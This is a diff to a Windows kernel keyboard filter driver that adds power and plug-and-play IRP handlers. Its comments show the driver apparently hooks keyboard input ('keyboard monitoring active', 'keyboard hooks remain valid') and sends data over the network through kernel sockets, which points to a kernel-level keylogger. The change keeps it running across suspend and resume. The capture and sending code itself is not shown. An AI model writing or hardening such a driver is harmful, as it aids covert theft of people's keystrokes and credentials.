@@ -973,6 +973,184 @@ Return Value:
     None.
 
 --*/
+
+/*++
+
+Routine: KbdIrp_Power
+
+Description:
+    Handles IRP_MJ_POWER requests. Detects system suspend/resume events
+    and logs them for debugging. This ensures the driver is aware of
+    power state transitions.
+
+Arguments:
+    DeviceObject - Pointer to our filter device object
+    Irp          - Pointer to the power IRP
+
+Return Value:
+    STATUS_SUCCESS after forwarding IRP to lower driver
+
+--*/
+NTSTATUS
+KbdIrp_Power(
+    _In_ PDEVICE_OBJECT DeviceObject,
+    _Inout_ PIRP Irp
+)
+{
+    NTSTATUS Status;
+    PIO_STACK_LOCATION IrpStack;
+    PKBDDRIVER_DEVICE_EXTENSION DeviceExtension;
+    PLIST_ENTRY ListEntry;
+    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
+    
+    UNREFERENCED_PARAMETER(DeviceObject);
+    
+    IrpStack = IoGetCurrentIrpStackLocation(Irp);
+    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
+    
+    //
+    // Detect system resume from suspend (transition to S0 working state)
+    //
+    if (IrpStack->MinorFunction == IRP_MN_SET_POWER &&
+        IrpStack->Parameters.Power.Type == SystemPowerState &&
+        IrpStack->Parameters.Power.State.SystemState == PowerSystemWorking)
+    {
+        KBD_INFO("System resumed from suspend - keyboard monitoring active");
+        
+        //
+        // Network reconnection happens automatically on next send attempt
+        // WSK handles socket state internally, no manual reconnect needed
+        //
+        
+        //
+        // Keyboard hooks remain valid after resume since we hook at the
+        // file object level, which persists across power transitions
+        //
+    }
+    
+    //
+    // Find the first keyboard object to forward the IRP
+    //
+    ListEntry = DeviceExtension->KbdObjListHead.Flink;
+    KeyboardObject = NULL;
+    
+    if (ListEntry != &DeviceExtension->KbdObjListHead)
+    {
+        KeyboardObject = CONTAINING_RECORD(
+            ListEntry,
+            KBDDRIVER_KEYBOARD_OBJECT,
+            ListEntry
+        );
+    }
+    
+    //
+    // Always forward power IRPs down the device stack
+    // This is critical for proper power management
+    //
+    PoStartNextPowerIrp(Irp);
+    IoSkipCurrentIrpStackLocation(Irp);
+    
+    if (KeyboardObject != NULL)
+    {
+        Status = PoCallDriver(KeyboardObject->KbdDeviceObject, Irp);
+    }
+    else
+    {
+        //
+        // No keyboard object available, complete with success
+        //
+        Status = STATUS_SUCCESS;
+        Irp->IoStatus.Status = Status;
+        IoCompleteRequest(Irp, IO_NO_INCREMENT);
+    }
+    
+    return Status;
+}
+
+/*
+Routine: KbdIrp_Pnp
+
+Description:
+    Handles IRP_MJ_PNP requests for plug and play events such as
+    device arrival, removal, and query operations.
+
+Arguments:
+    DeviceObject - Pointer to our filter device object
+    Irp          - Pointer to the PnP IRP
+
+Return Value:
+    NTSTATUS from IoCallDriver
+--*/
+NTSTATUS
+KbdIrp_Pnp(
+    _In_ PDEVICE_OBJECT DeviceObject,
+    _Inout_ PIRP Irp
+)
+{
+    NTSTATUS Status;
+    PIO_STACK_LOCATION IrpStack;
+    PLIST_ENTRY ListEntry;
+    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
+    PKBDDRIVER_DEVICE_EXTENSION DeviceExtension;
+    
+    UNREFERENCED_PARAMETER(DeviceObject);
+    
+    IrpStack = IoGetCurrentIrpStackLocation(Irp);
+    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
+    
+    //
+    // Find matching keyboard object for this file object
+    //
+    ListEntry = DeviceExtension->KbdObjListHead.Flink;
+    KeyboardObject = NULL;
+    
+    while (ListEntry != &DeviceExtension->KbdObjListHead)
+    {
+        KeyboardObject = CONTAINING_RECORD(
+            ListEntry,
+            KBDDRIVER_KEYBOARD_OBJECT,
+            ListEntry
+        );
+        
+        if (KeyboardObject->KbdFileObject == IrpStack->FileObject)
+        {
+            break;
+        }
+        
+        KeyboardObject = NULL;
+        ListEntry = ListEntry->Flink;
+    }
+    
+    //
+    // Forward PnP IRP to the appropriate device
+    //
+    IoSkipCurrentIrpStackLocation(Irp);
+    
+    if (KeyboardObject != NULL)
+    {
+        Status = IoCallDriver(KeyboardObject->KbdDeviceObject, Irp);
+    }
+    else
+    {
+        //
+        // No keyboard object found - forward to base keyboard driver
+        //
+        if (DeviceExtension->KbdDriverObject != NULL &&
+            DeviceExtension->KbdDriverObject->DeviceObject != NULL)
+        {
+            Status = IoCallDriver(DeviceExtension->KbdDriverObject->DeviceObject, Irp);
+        }
+        else
+        {
+            Status = STATUS_SUCCESS;
+            Irp->IoStatus.Status = Status;
+            IoCompleteRequest(Irp, IO_NO_INCREMENT);
+        }
+    }
+    
+    return Status;
+}
+
 VOID 
 KbdDriver_Unload(
     _In_ PDRIVER_OBJECT DriverObject
@@ -1117,11 +1295,13 @@ DriverEntry(
     InitializeListHead(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead);
     KeInitializeSpinLock(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);
 
-    //
+	//
     // Set up driver dispatch routines
     //
     DriverObject->MajorFunction[IRP_MJ_READ] = KbdIrp_Read;
     DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KbdIrp_DeviceControl;
+    DriverObject->MajorFunction[IRP_MJ_POWER] = KbdIrp_Power;
+    DriverObject->MajorFunction[IRP_MJ_PNP] = KbdIrp_Pnp;
     DriverObject->DriverUnload = KbdDriver_Unload;
 
     //
